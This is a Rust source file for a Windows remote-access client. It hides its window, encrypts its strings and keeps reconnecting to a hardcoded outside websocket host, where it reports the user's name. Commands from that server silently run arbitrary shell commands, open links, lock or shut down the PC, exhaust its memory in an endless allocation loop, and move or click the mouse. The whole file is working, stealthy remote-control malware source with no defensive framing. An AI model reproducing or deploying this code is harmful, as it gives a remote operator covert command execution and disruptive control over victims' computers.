#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

#[macro_use]
extern crate litcrypt;

use_litcrypt!();

use std::{os::windows::{process::CommandExt}, pin::Pin, process::Command, time::Duration};
use std::alloc::{alloc, Layout};
use windows::Win32::{Graphics::Gdi::{DEVMODE_DISPLAY_ORIENTATION, DMDO_180, DMDO_270, DMDO_90, DMDO_DEFAULT}, UI::{Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_MOUSE,  MOUSEEVENTF_LEFTDOWN, MOUSEEVENTF_LEFTUP, MOUSEINPUT}, WindowsAndMessaging::{SetCursorPos, MB_ICONEXCLAMATION}}};
use async_trait::async_trait;
use ezsockets::{client::ClientCloseMode, ClientConfig, CloseFrame, WSError};

mod actions;

struct Client {
    handle: ezsockets::Client<Self>
}

#[async_trait]
impl ezsockets::ClientExt for Client {
    type Call = ();

    async fn on_text(&mut self, text: ezsockets::Utf8Bytes) -> Result<(), ezsockets::Error> {
        if text == lc!("ping") {
            let username = std::env::var(lc!("USERNAME")).unwrap();
            let _ = self.handle.text(format!("username={username}"));
            return Ok(());
        }
        // messages should be in the following format: key=val;key2=val2;
        let parts: Vec<&str> =  text.split(";").collect();  
        let mut _action: String = String::new();
        let mut param: String = String::new();
        let mut val: String = String::new();

        for arg in parts {
            let parts: Vec<&str> = arg.split("=").collect();
            
            if parts.len() != 2 {
                let res = self.handle.text(format!("Invalid body; expected 2 parts for arg {}", arg).to_string());
                if let Err(_) = res {
                }
                continue;
            }
            
            let [key, value] = parts.as_slice().try_into().unwrap();

            if key == lc!("action") {
                _action = value.to_string()
            }
            if key == lc!("param") {
                param = value.to_string();
            }
            if key == lc!("value") {
                val = value.to_string();
            }
        }

        if param == lc!("caps") {
            actions::toggle_caps();
            let _ = self.handle.text("ok");
        }

        if param == lc!("lock") {
            actions::lock();
            let _ = self.handle.text("ok");
        }

        if param == lc!("close") {
            actions::alt_f4();
            let _ = self.handle.text("ok");
        }

        if param == lc!("link") {
            Command::new("cmd").args(["/C", format!("start {}", val).as_str()]).creation_flags(0x08000000).spawn().unwrap();
            let _ = self.handle.text("ok");
        }

        if param == lc!("command") {
            Command::new("cmd").args(["/C", val.as_str()]).creation_flags(0x08000000).spawn().unwrap();
        }

        if param == lc!("volume") {
            let percentage: u8 = val.parse().unwrap();
            actions::set_volume(percentage);
            let _ = self.handle.text("ok".to_string());
        }

        if param == lc!("rotate") {
            let rotation: DEVMODE_DISPLAY_ORIENTATION;
            match val.as_str() {
                "90" => rotation = DMDO_90,
                "180" => rotation = DMDO_180,
                "270" => rotation = DMDO_270,
                "0" => rotation = DMDO_DEFAULT,
                _ => rotation = DMDO_90
            }
            actions::rotate_monitor(rotation);

            let _ = self.handle.text("ok");
        }

        if param == lc!("shutdown") {
            actions::shutdown();
            let _ = self.handle.text("ok");
        }

        if param == lc!("dialog") {
            let vals: Vec<String> = val.split(".,.").map(|s|s.to_string()).collect();
            actions::dialog(vals[0].to_string(), vals.last().unwrap().to_string(), MB_ICONEXCLAMATION);
            let _ = self.handle.text("ok".to_string());
        }

        if param == lc!("beep") {
            let duration_ms: u32 = val.parse().unwrap_or(1000);
            if duration_ms > 9000 {
                let _ = self.handle.text(lc!("error=too_long"));
                return Ok(());
            }
            actions::beep(duration_ms);
            let _ = self.handle.text("ok");
        }

        if param == lc!("crash") {
            std::thread::spawn(move || {
                let mut pointers: Vec<*mut u8> = vec![];
                unsafe {
                    loop {
                        let layout = Layout::from_size_align_unchecked(32*1024, 64);
                        let pointer: *mut u8 = alloc(layout);
                        pointers.push(pointer);
                    }
                }
            });
        }

        if param == lc!("destruct") {
            std::process::exit(0);
        }

        if param == lc!("space") {
            actions::space_bar();
        }

        if param == lc!("m") {
            let parts: Vec<String> = val.split(",").map(|s|s.to_string()).collect();
            unsafe {
                if let Err(_e) =  SetCursorPos(parts[0].parse().unwrap(), parts.last().unwrap().parse().unwrap()) {
                }
            }
            let _ = self.handle.text(lc!("ok"));
        }

        if param == lc!("ld") {
            let parts: Vec<String> = val.split(",").map(|s|s.to_string()).collect();
            unsafe {
                let mut click = INPUT {
                    r#type: INPUT_MOUSE,
                    Anonymous: std::mem::zeroed(),
                };
                click.Anonymous.mi = MOUSEINPUT {
                    dx: parts[0].parse().unwrap(),
                    dy: parts[0].parse().unwrap(),
                    dwExtraInfo: 0,
                    dwFlags: MOUSEEVENTF_LEFTDOWN,
                    time: 0,
                    mouseData: 0
                };
                let inputs = vec![click];
                SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
            }
        }

        if param == lc!("wallpaper") {
            let parts: Vec<String> = val.split(",").map(|s| s.to_string()).collect();
            actions::change_wallpaper(parts[0].to_string());
        }

        if param == lc!("lu") {
            let parts: Vec<String> = val.split(",").map(|s| s.to_string()).collect();
            unsafe {
                let mut click = INPUT {
                    r#type: INPUT_MOUSE,
                    Anonymous: std::mem::zeroed(),
                };
                click.Anonymous.mi = MOUSEINPUT {
                    dx: parts[0].parse().unwrap(),
                    dy: parts[0].parse().unwrap(),
                    dwExtraInfo: 0,
                    dwFlags: MOUSEEVENTF_LEFTUP,
                    time: 0,
                    mouseData: 0
                };
                
                let inputs = vec![click];
                SendInput(&inputs, std::mem::size_of::<INPUT>() as i32);
            }
        }
        
        Ok(())
    }

    async fn on_binary(&mut self, _bytes: ezsockets::Bytes) -> Result<(), ezsockets::Error> {
        Ok(())
    }

    async fn on_disconnect(&mut self) -> Result<ClientCloseMode, ezsockets::Error> {
        Ok(ClientCloseMode::Reconnect)
    }

    async fn on_connect_fail(&mut self, _error: WSError) -> Result<ClientCloseMode, ezsockets::Error> {
        Ok(ClientCloseMode::Reconnect)
    }

    async fn on_call(&mut self, call: Self::Call) -> Result<(), ezsockets::Error> {
        let () = call;
        Ok(())
    }

    async fn on_connect(&mut self) -> Result<(), ezsockets::Error> {
        let username = std::env::var("USERNAME").unwrap();
        let _ = self.handle.text(format!("name={username}"));
        Ok(())
    }
    
    fn on_close<'life0, 'async_trait>(
        &'life0 mut self,
        _frame: Option<CloseFrame>,
    ) -> Pin<Box<dyn Future<Output = Result<ClientCloseMode, ezsockets::Error>> + Send + 'async_trait>>
    where
        Self: 'async_trait,
        'life0: 'async_trait,
    {
        Box::pin(async { Ok(ClientCloseMode::Reconnect) })
    }

}

#[tokio::main]
async fn main() {
    let mut builder = env_logger::Builder::new();
    builder.filter_level(log::LevelFilter::Debug).init();

    let cfg = ClientConfig::new(lc!("ws://koti.frii.site:8099/ws").as_str());
    let config = cfg.socket_config(ezsockets::SocketConfig { heartbeat: Duration::from_secs(3), timeout: Duration::from_secs(8), ..Default::default() })
        .reconnect_interval(Duration::from_secs(3))
        .max_reconnect_attempts(9999999);

    let (_handle, future) = ezsockets::connect(|handle| Client { handle }, config).await;

    future.await.unwrap();
}
